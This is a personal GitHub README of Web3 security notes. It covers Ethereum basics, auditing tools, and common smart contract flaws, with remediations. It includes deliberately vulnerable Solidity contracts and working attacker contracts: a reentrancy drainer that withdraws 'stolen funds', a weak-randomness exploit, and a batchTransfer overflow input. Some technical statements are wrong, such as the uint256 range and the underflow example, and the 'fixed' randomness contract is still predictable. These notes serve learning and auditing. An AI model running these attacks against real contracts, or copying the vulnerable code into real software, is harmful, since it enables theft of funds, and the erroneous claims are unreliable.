# Web3 security notes ![eth](https://img.shields.io/badge/ETH-riccardomalatesta.eth-blue)

Personal notes about Web3 from a hacker's perspective. Here I gather all the resources about Web3's insecurity.

## Index

- [Resources](#resources)
- [Introduction](#introduction)
- [Development](https://github.com/seeu-inspace/reference-web3-security/tree/main/development)
- [Tools](#tools)
  - [Metamask](#metamask)
  - [Etherscan.io](#etherscanio)
  - EVM Codes https://www.evm.codes/
  - [Remix](#remix)
  - [Hardhat](#hardhat)
  - Truffle Suite https://trufflesuite.com/
  - Brownie https://eth-brownie.readthedocs.io/en/stable/
  - [Infura.io](#infuraio)
  - [Ganache](#ganache)
  - [Web3.js](#web3js)
  - Solgraph
  - [Mythril](#mythril)
  - MythX
  - Slither
  - [ZIION](#ziion)
  - [OpenZeppelin contracts](#openzeppelin-contracts)
  - [Simple Security Toolkit](#simple-security-toolkit)
- [Vulnerabilities](#vulnerabilities)
  - [Human errors](#human-errors)
  - [Integer Overflow / Underflow](#integer-overflow--underflow)
  - [Reentrancy Vulnerabilities](#reentrancy-vulnerabilities)
  - [Authorization issues](#authorization-issues)
  - [Use of components with known vulnerabilities](#use-of-components-with-known-vulnerabilities)
  - [Weak Randomness](#weak-randomness)
  - Flash Loan Attacks
  - Unchecked Return Values For Low Level Calls
  - Denial of Service
  - Front-Running
  - Time manipulation
  - Short Address Attack

## Resources

**Web3 Security Library**<br/>
[github.com/immunefi-team/Web3-Security-Library](https://github.com/immunefi-team/Web3-Security-Library)

**Smart contract weakness classification** and Test Cases <br/>
[swcregistry.io](https://swcregistry.io/) | [SCSV](https://securing.github.io/SCSVS/)

**Rekt updates** To stay up-to-date with the latest crypto hacks <br/> 
[rekt.news](https://rekt.news/) | [DeFi Hacks Analysis - Root Cause](https://wooded-meter-1d8.notion.site/0e85e02c5ed34df3855ea9f3ca40f53b?v=22e5e2c506ef4caeb40b4f78e23517ee)

**Blogs** <br/> 
[Immunefi's blog](https://immunefi.medium.com/) | [OpenZeppelin's blog](https://blog.openzeppelin.com/) | [Halborn's blog](https://halborn.com/blog/) | [SlowMist's blog](https://slowmist.medium.com/) | [PWNING's blog](https://pwning.mirror.xyz/)

**Public Security Audits** <br/> 
[OpenZeppelin's public Security Audits](https://blog.openzeppelin.com/security-audits/) | [Halborn's public Security Audits](https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity%20Smart%20Contract%20Audits)

## Introduction

The **Blockchain** is a set of technologies in which the ledger is structured as a chain of blocks containing transactions and consensus distributed on all nodes of the network. All nodes can participate in the validation process of transactions to be included in the ledger.

There are two types of operations that are carried out to create a cryptocurrency:
- **Mining (Proof-of-Work)** Validation of transactions through the resolution of mathematical problems by miners who use hardware and software dedicated to these operations. Whoever solves the problem first wins the right to add a new block of transactions and a reward;
- **Staking (Proof-of-Staking)** consists of users who lock their tokens in a node called a validator. The validators take turns checking the transactions on the network. If they perform well, they receive a prize distributed among all the participants of the validator, otherwise, they receive a penalty.

**Ethereum** is a blockchain that has popularized an incredible innovation: smart contracts, which are a program or collection of code and data that reside and function in a specific address on the network. Thanks to this factor, it is defined as a "programmable blockchain".

Note: By design, smart contracts are immutable.  This means that once a Smart Contract is deployed, it cannot be modified, with the exception of the [Proxy Upgrade Pattern](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies).

A token can be created with a smart contract. Most of them reside in the ERC20 category, which is fungible tokens. Other tokens are ERC-721 and ERC-1155, aka NFTs.

A **decentralized application**, also known as **DApp**, differs from other applications in that, instead of relying on a server, it uses blockchain technology. To fully interact with a DApp you need a wallet.
DApps are developed both with a user-friendly interface, such as a web, mobile or even desktop app, and with a smart contract on the blockchain. 

The fact that there is a user-friendly interface means that the "old vulnerabilities" can still be found. An example: If a DApp has a web interface, maybe an [XSS](https://owasp.org/www-community/attacks/xss/) on it can be found and exploited. Another evergreen is phishing, that is frequently used to steal tokens and NFTs.

The source code of the Smart Contracts is often written in **Solidity**, an object-oriented programming language. Another widely used programming language, but less than Solidity, is **Vyper** (Python).

Most of the time the smart contract code is found public in a github such as `github.com/org/project/contracts/*.sol` or you can get it from Etherscan, for example by going to the contract address (such as that of the DAI token), in the Contract tab you will find the code https://etherscan.io/address/0x6b175474e89094c44da98b954eedeac495271d0f#code and contract ABI > a json which indicates how the functions of the smart contract are called.
In any case, the source is almost always public. If it's not public, you can use an EVM bytecode decompiler such as https://etherscan.io/bytecode-decompiler, just enter the contract address here.

[Bitcoin whitepaper](https://bitcoin.org/bitcoin.pdf) | [Ethereum whitepaper](https://ethereum.org/en/whitepaper/)

#### Ethereum glossary

- **application binary interface (ABI)** The standard way to interact with contracts in the Ethereum ecosystem, both from outside the blockchain and for contract-to-contract interactions.

- **bytecode** An abstract instruction set designed for efficient execution by a software interpreter or a virtual machine. Unlike human-readable source code, bytecode is expressed in numeric format.

- **Ethereum Improvement Proposal (EIP)** A design document providing information to the Ethereum community, describing a proposed new feature or its processes or environment.

- **Ethereum Request for Comments (ERC)** A label given to some EIPs that attempt to define a specific standard of Ethereum usage.

- **Ethereum Virtual Machine (EVM)** is a complex, dedicated software virtual stack that executes contract bytecode and is integrated into each entire Ethereum node. Simply said, EVM is a software framework that allows developers to construct Ethereum-based decentralized applications (DApps).

- **hard fork** A permanent divergence in the blockchain; also known as a hard-forking change. One commonly occurs when nonupgraded nodes can't validate blocks created by upgraded nodes that follow newer consensus rules. Not to be confused with a fork, soft fork, software fork, or Git fork.

- **wei** The smallest denomination of ether. 10<sup>18</sup> wei = 1 ether.

You can find more here: [ethereum.org/en/glossary/](https://ethereum.org/en/glossary/)

## Tools

### <ins>Metamask</ins>

Metamask is an application available as an extension for browsers such as Firefox and Google Chrome or even as a mobile app.

It allows you to create a wallet for cryptocurrencies. It can be very useful to use a decentralized application.

To install Metamask go here, and follow the instructions> https://metamask.io/

To connect to a decentralized app (or DApp) the process is often the same for all applications. An example is UniSwap: unlock the Metamask application, press the Connect Wallet button and select Metamask.

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/uniswap-connect.png" width="75%" height="75%">

### <ins>[Etherscan.io](https://etherscan.io)</ins>

Etherscan.io is the primary reference tool for exploring the Ethereum blockchain.

In a page of a Contract: 
- In Contract Overview you can see the balance in the contract and the balance of Ethereum;
- In More Info we can see the address of the wallet that created the contract and with which transaction. Lastly, the token tracker;
- Below you can see the transactions with method (=> what was done in that transaction), also divided by the various ERC20 tokens and Analytics;
- Another tab is "Contract", where you can see the code of the smart contract, ABI and EVM Bytecode

For other types of addresses (wallet and token tracker) there aren't other relevant details.

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/etherscan.png" width="75%" height="75%">

### <ins>Remix</ins>

An IDE that provides a compiler, debugger, and various test accounts with some $ETH for each. This is very useful for manual testing without impacting the real Smart Contract target of the tests. It can also be used to deploy the Smart Contracts in local test nodes.

[remix.ethereum.org](https://remix.ethereum.org)

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/remix.png" width="75%" height="75%">

### <ins>Hardhat</ins>

Hardhat is a development environment for Ethereum software. It consists of different components for editing, compiling, debugging and deploying your smart contracts and dApps, all of which work together to create a complete development environment. [Installation](https://hardhat.org/hardhat-runner/docs/getting-started#installation)

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/hardhat.png" width="75%" height="75%">

### <ins>Infura.io</ins>

A very useful tool used by most decentralized apps for backend development of apps on Ethereum. It allows you to easily interact with a node on Ethereum or with IPFS. The most useful tool is especially Infura API.

Once registered in https://infuria.io, go to https://infuria.io/dashboard, click 'Create New Project' at the top right. Once created, you will find yourself in the project settings. In 'Keys' you will see the endpoints to connect to a node on the Ethereum network.

### <ins>Ganache</ins>

To have a local test node you can use a program called ganache. This is a fast solution to deploy and test a dApp in total safety.

To install it: `npm install -g ganache-cli`. To run it: `ganache-cli`

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/ganache.png" width="75%" height="75%">

Resource: https://trufflesuite.com/ganache/

### <ins>web3.js</ins>

web3.js is very useful for interacting with a smart contract and its APIs. Install it by using the command `npm install web3`.

To use it and interact with a contract, use the following commands:
- `node`;
- `const Web3 = require('web3')`;
- `const URL = "http://localhost:8545"`. This is the URL where the contract is deployed, insert the url from Infura.io or Ganache;
- `const web3 = new Web3(URL)`;
- `accounts = web3.eth.getAccounts();`
- `var account`;
- `accounts.then((v) => {(this.account = v[1])})`;
- `const address = "<CONTRACT_ADDRESS>"`. Copy and paste the Contract Address;
- `const abi = <ABI>`. Copy and paste the ABI of the Smart Contract;
- `const contract = new web3.eth.Contract(abi, address)`.

Now you will be able to call the functions from web3.js

Resource: https://web3js.readthedocs.io/en/v1.7.5/

### <ins>Mythril</ins>

Mythril is a security analysis tool for EVM bytecode. It detects security vulnerabilities in smart contracts built for Ethereum, Hedera, Quorum, Vechain, Roostock, Tron and other EVM-compatible blockchains.

To install it `pip3 install mythril`. Then add your [infura](#infuraio) key with `myth --infura-id <INFURA_ID>`.

Usage:
- `myth analyze <solidity-file>`
- `myth analyze -a <contract-address>`
- Specify the maximum number of transaction to explore with `-t <number>`
- [More can be found here](https://mythril-classic.readthedocs.io/en/master/)

An example ([source](https://github.com/ConsenSys/mythril#usage))
```bash
> myth a killbilly.sol -t 3
==== Unprotected Selfdestruct ====
SWC ID: 106
Severity: High
Contract: KillBilly
Function name: commencekilling()
PC address: 354
Estimated Gas Usage: 974 - 1399
Any sender can cause the contract to self-destruct.
Any sender can trigger execution of the SELFDESTRUCT instruction to destroy this contract account and withdraw its balance to an arbitrary address. Review the transaction trace generated for this issue and make sure that appropriate security controls are in place to prevent unrestricted access.
--------------------
In file: killbilly.sol:22

selfdestruct(msg.sender)

--------------------
Initial State:

Account: [CREATOR], balance: 0x2, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x1001, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [ATTACKER], function: killerize(address), txdata: 0x9fa299cc000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef, decoded_data: ('0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef',), value: 0x0
Caller: [ATTACKER], function: activatekillability(), txdata: 0x84057065, value: 0x0
Caller: [ATTACKER], function: commencekilling(), txdata: 0x7c11da20, value: 0x0
```

### <ins>ZIION</ins>

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/ziion-os.jpg" width="75%" height="75%">

ZIION is an open-source Operating System with Kali Linux as a reference point, built for Web3 PenTesting. It contains over 100 tools, utilities, dependencies, and packages to immediately begin working with Solidity/EVM and Rust-based blockchains 

- Link: https://www.ziion.org/
- Documentation: https://docs.ziion.org/

### <ins>OpenZeppelin contracts</ins>

"OpenZeppelin contracts" is a library for secure smart contract development. A famous example is [SafeMath.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol) which helps to fix [Integer Overflow / Underflow](#integer-overflow--underflow). Once installed, you can use the contracts in the library by importing them:

```solidity
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
```

Resource: https://github.com/OpenZeppelin/openzeppelin-contracts

### <ins>Simple Security Toolkit</ins>

A collection of practical security-focused guides and checklists for smart contract development, assembled by the Nascent team. Link: [github.com/nascentxyz/simple-security-toolkit](https://github.com/nascentxyz/simple-security-toolkit)

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/simple-security-toolkit.png" width="75%" height="75%">

## Vulnerabilities

### <ins>Human errors</ins>

When tested other types of application, an attacker does not generally have access to the backand code accordingly cannot know the names of the parameters to be used, the hidden functions etc. This is not entirely true but the fact that it is not an immediate aspect provides a false sense of security.
For smart contracts, however, this cannot be applied. The code is always public, a function can be private and not directly accessible but it is still readable by anyone.


A smart contract has a cost. A longer code with variables of certain types rather than others increases the expense of setting up the contract on a blockchain. Consequently, programmers try to optimize the code as much as possible. This can bring less safe development to be able to save on costs.


Furthermore, once a smart contract is active it is impossible to make changes. For this reason it is necessary to perform careful security checks to verify that everything is safe.


### <ins>Integer Overflow / Underflow</ins>

**Integer Overflow** happens because the arithmetic value of the operation exceeds the maximum size of the variable value type. An example: the variable `amount` is `uint256`. It supports numeric values from 0 to 2 ^ 256. This means that a value like `0x8000000000000000000000000000000000000000000000000000000000000000` corresponding to the decimal value `57896044618658097711785492504343953926634992332820282019728792003956564819968` received in the input for the variable `amount` would trigger a Batch Overflow since it exceeds the maximum value supported.

A real example of this attack: Beauty Chain exploit https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f. Beauty Chain smart contract code: https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code.

The function vulnerable to a Batch Overflow on Beauty Chain is `batchTransfer`.

```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.6;

contract BEC_Target{

mapping(address => uint) balances;

function batchTransfer(address[] memory _receivers, uint256 _value) public payable returns (bool) {
    uint cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);

    balances[msg.sender] = balances[msg.sender] - amount;
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]] + _value;
    }
    return true;
  }

    function deposit() public payable{
        balances[msg.sender] += msg.value;       
    }

    function getBalance() public view returns(uint){
        return balances[msg.sender];
    }

}
```

An input like `["<ADDR_1>","<ADDR_2>"], 0x8000000000000000000000000000000000000000000000000000000000000000` for the function `batchTransfer` would trigger this vulnerability.

**Integer Underflow** happens in the exact opposite of the overflow error. It error occurs when you go below the minimum amount. This triggers the system to bring you right back up to maximum value instead of reverting to zero.

For example, injecting the value `-1` in a `uint256` variable that stores the value `0` will result in the number 255.

#### Remediation

As seen previously, the problem lies in the variable `amount` which, having no input controls, is subject to a Integer Overflow/Underflow. The solution to this problem is to implement a check on the value received as an input. An example is the following:

```solidity
if (a == 0) return (true, 0);
uint256 c = a * b;
if (c / a != b) return (false, 0);
return (true, c);
```

The variable `uint256 c` is the multiplication of the address of recipient `a` by the value of the number of tokens that must receive `b`, giving the result `c`. To make sure that the value `c` is not Overfloded or Underfloded, we check that the division of `c` / `a` is equal to `b`. If not, it would indicate that the value `c` makes no sense and has been compromised.

To fix this vulnerability, and other integer overflows and underflows, the [SafeMath library by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts) can be used. SafeMath provides four functions: Add, Subtract, Multiply, Divide. Each of them performs a check on the operation to verify that the data received in input is valid.

### <ins>Reentrancy Vulnerabilities</ins>

A Reentrancy vulnerability is a type of attack to drain the bit-by-bit liquidity of a contract with an insecure code-writing pattern.

An incorrect flow first verifies that the user has a sufficient balance to execute the transaction, then sends the funds to the user. Only if the operation is successful, at that point, does it update the user's balance. The problem arises because if a contract invokes this operation instead of a user, it can create code that generates a loop. This means that an attacker can invoke the withdrawal function many times because it is the same balance that is checked as the initial value.

An example:

```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;
    
contract simpleReentrancy {
	mapping (address => uint) private balances;
	
	function deposit() public payable  {
		require((balances[msg.sender] + msg.value) >= balances[msg.sender]);
		balances[msg.sender] += msg.value;
	}
 
	function withdraw(uint withdrawAmount) public returns (uint) {
		require(withdrawAmount <= balances[msg.sender]);
		msg.sender.call.value(withdrawAmount)("");

		balances[msg.sender] -= withdrawAmount;
		return balances[msg.sender];
	}
    
	function getBalance() public view returns (uint){
		return balances[msg.sender];
	}
}
```

The vulnerable function is `withdraw`. As you can see, first it checks that the balance is sufficient, then the withdrawal is made and only after this step the balance is being updated.

1. An attacker deposits a small amount into his account and calls the withdraw function of the contract by withdrawing an amount less than his balance;
2. The victim contract interacts with the attacker's contract trying to provide the requested funds;
3. The attacker will respond with a fallback function that will call the withdrawal another time, but the victim contract has not yet updated the user's balance so it will keep the initial one despite the previous operation.

An example code of a malicious smart contract is as follows:

```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

interface targetInterface{
	function deposit() external payable; 
	function withdraw(uint withdrawAmount) external; 
}
 
contract simpleReentrancyAttack{
	targetInterface bankAddress = targetInterface(TARGET_ADDRESS_HERE); 
	uint amount = 1 ether; 
 
	function deposit() public payable{
		bankAddress.deposit.value(amount)();
	}

	function attack() public payable{
		bankAddress.withdraw(amount); 
	}

	function retrieveStolenFunds() public {
		msg.sender.transfer(address(this).balance);
	}

	fallback () external payable{ 
		if (address(bankAddress).balance >= amount){
			bankAddress.withdraw(amount);
		}   
	}
}
```

1. This contract checks that the balance on the smart contract is greater than 1 ETH. Call the external withdraw function of the victim's smart contract, which will provide the requested funds;
2. Not having received further instructions after receiving the funds, the fallback function is triggered immediately. When the latter is activated, the smart contract has not yet updated the attacker's balance, so it will proceed to carry out the withdrawal operation with the previous balance;
3. The malicious smart contract receives the funds and no further instructions, so it repeats the step 2.


#### Remediation

Implement Checks Effects Interactions Pattern: A secure code-writing pattern that prevents an attacker from creating loops that allow him to re-enter the contract multiple times without blocking.

- Verify that the requirements are met before continuing the execution;
- Update balances and make changes before interacting with an external actor;
- Finally, after the transaction has been validated and the changes have been made, interactions with the external entity are allowed.

#### Resources

- [A Historical Collection of Reentrancy Attacks]()



### <ins>Authorization issues</ins>

A function can be: External, Public, Internal or Private. Defining this aspect is very important as there is a risk of allowing potentially harmful operations or giving administrative privileges to any user.

A first example is the following `withdraw` function. As you can see, it does not check if the user requesting a certain amount has the funds to request the withdrawal.

```solidity
function withdraw(uint amount) public payable {
	msg.sender.transfer(amount);
}
```

Another example is the following `kill()` function. The `kill` function contains the method `selfdestruct` that allows to withdraw all the contract funds in the user's balance which activates the functionality and invalidates the smart contract. Since this function is public, any user can have access to it.

```solidity
function kill() public {
	selfdestruct(msg.sender);
}
```

Here's how problematic this can become:

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/eth-kill-function.png" width="50%" height="50%">


Another example is a function like `initContract()`, a common pattern used to identify the owner of a Smart Contract to grant major privileges. It designates the address which initializes it as the contract's owner, but the problem is that the initialization function can be called by anyone, even after it has already been called.

```solidity
function initContract() public {
	owner = msg.sender;
}
```


#### Remediation

A solution for the first scenario is very simple, it just needs a check to be implemented.

For the second example, you can add the following modifier. In the modifier there is the condition that whoever is carrying out the function must be the owner of the contract.

```solidity
address owner;

modifier OnlyOwner(){
    require(msg.sender == owner);
    
    _;

}
```

So the fixed code would look like this:

```solidity
mapping (address =>uint) balances;
    
address owner;
    
modifier OnlyOwner(){
    require(msg.sender == owner);
    
    _;

}

function kill() public OnlyOwner{
		selfdestruct(msg.sender);
}
```

### <ins>Use of components with known vulnerabilities</ins>

An outdated compiler with known vulnerabilities may have been used to compile the smart contract. Another possibility is that libraries with known vulnerabilities have been imported.

Another problem is code reuse: many programmers reuse code for their applications. This means that if the copied code contains vulnerabilities, the same is true for the application it was pasted into.

### Weak Randomness

Weak Randomness arises when the attacker can predict the result of a random number. This can cause some security issues depending on the scenario.

As of now, two methods are commonly used to acquire Randomness: 

**1. Block variables**

How it's composed a block variable:

```solidity
block.basefee(uint): the base fee for the current block
block.chainid(uint): current chain ID
block.coinbase(): current block miner address, address payable
block.difficulty(uint): current block difficulty
block.gaslimit(uint): current block gas limit
block.number(uint): current block number
block.timestamp(uint): current block timestamp (in seconds) since Unix epoch
blockhash(uint blockNumber) returns (bytes32): the hash of the given block, representing the most recent 256 blocks
```

Out of those, the most frequently used are block.difficulty, blockhash, block.number, and block.timestamp. Randomness generated by block data limits the possibility of regular users to predict that random number, but not to miners.

Miners do not have to broadcast when they have mined a block. Blocks can also be discarded by miners. This proecss is called selective packing. Miners will keep trying to generate randomness until they acquire the desired result, with which they will then broadcast a block. 

Obtaining Randomness using block variables is more suitable for some Randomness that don’t belong to a core application.

**2. Oracles**

An example of an oracle is [ChainLink](https://chain.link/). There are oracles specifically built to generate random number seeds that are then used by other applications to generate randomness.

This comes with some risks, such as being dependent on a third-party to provide you a random number seed and being sure that the oracle doesn't get corrupted. Even if you create your own oracle, your application will always depend on the integrity of it.

That said, oracles are the most reliable way to have strong randomness.

**Example of an unsecure smart contract**

```solidity
pragma solidity ^0.8.13;

contract GuessTheRandomNumber { 
	constructor() payable {}
	function guess(uint _guess) public { 
		uint answer = uint( keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)) );
		if (_guess == answer) { 
			(bool sent, ) = msg.sender.call{value: 1 ether}(""); 
			require(sent, "Failed to send Ether"); 
		} 
	}
}
```

The contract deployer uses the block hash and block time of the previous block as the random number seed to generate Randomness. So an attacker needs to simulate his random number generation method to be rewarded. The attacker smart contract:

```solidity
pragma solidity ^0.8.13;

contract Attack { 
	receive() external payable {}
	function attack(GuessTheRandomNumber guessTheRandomNumber) public { 
		uint answer = uint( keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)) );
		guessTheRandomNumber.guess(answer); 
	}
	function getBalance() public view returns (uint) { 
		return address(this).balance; 
	}
}
```

1. `Attack.attack()` simulates the random number generation method found in the GuessTheRandomNumber contract;
2. `guessTheRandomNumber.guess()` is called and the generated random number is passed in;
   `.guess()` is executed in the same block where the two parameters, block.number and block.timestamp are unchanged. 
3. `Attack.attack() `and `guessTheRandomNumber.guess()` produce the same results of the Randomness generated by each function, allowing the attacker to successfully pass the `if(_guess == answer)` condition and receive the reward.

#### Remediation

If the random number belongs to a non-core enterprise, you can use the hash of the future block to generate the random number. Otherwise is better to rely on an oracle.

An example of the fixed example comes from [SlowMist's blog](https://slowmist.medium.com/introduction-to-smart-contract-security-randomness-792cf8997599#6bf1)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract GuessTheRandomNumber { 
	constructor() payable {}
	uint256 public deadline = block.timestamp + 72 hours;
	mapping ( address => uint256 ) public Answer;
	modifier isTime(){ 
		require(block.timestamp > deadline , "Not the time!");
        	_;
	}

	event Guess(address,uint256); 
	event Claim(address);

	function guess(uint256 _guess) public { 
		require(block.timestamp <= deadline , "Too late!"); 
		Answer[msg.sender] = _guess; 
        emit Guess(msg.sender, _guess); 
	}

	function claim() public isTime{ 
		uint256 key = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); 
		uint256 answer = Answer[msg.sender]; 
		require(key == answer , "Sorry, maybe next time."); 
		(bool sent, ) = msg.sender.call{value: 1 ether}(""); 
		require(sent, "Failed to send Ether"); 
		emit Claim(msg.sender); 
	}

}
```
